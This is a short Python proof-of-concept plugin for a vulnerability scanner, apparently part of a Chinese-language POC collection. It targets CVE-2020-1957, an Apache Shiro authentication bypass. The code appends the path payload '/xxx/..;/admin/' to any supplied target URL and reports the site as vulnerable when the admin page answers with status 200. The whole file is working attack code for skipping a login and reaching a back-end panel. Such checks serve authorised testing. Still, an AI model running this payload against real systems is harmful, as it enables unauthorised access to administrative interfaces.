import pocs

class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        super().__init__()
        self.poc_name='shiro 未授权访问漏洞'
        self.vul_name='shiro 未授权访问漏洞'
        self.vul_num='CVE-2020-1957'
        self.app_name='shiro'
        self.app_version='12.x'
        self.author='haochen'
        self.msg='直接访问管理页面/admin/会被重定向至登陆页面，访问/xxx/..;/admin/可绕过登陆直接进入后台'

    def scanner(self,parameter):
        '''
            扫描使用的函数
        '''
        url = parameter['target']
        self.parameter = parameter
        self.att_msg['target'] = self.parameter['target']
        head = pocs.Pack
        self.att_msg['payload']='/xxx/..;/admin/'
        if pocs.re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.att_msg['payload']
        try:
            response = pocs.requests.get(target,headers=head)
            if response.status_code == 200:
                self.att_msg['status']='success'
                self.att_msg['msg'] = '存在漏洞！'
            else:
                self.att_msg['status']='failed'
                self.att_msg['msg'] = '不存在漏洞，网站返回值为: '+str(response.status_code) 
        except:
            self.att_msg['status']='error'
            self.att_msg['msg'] = '无法正确访问网站！'
        self.__cout()
    
    def __cout(self):
        super().cout()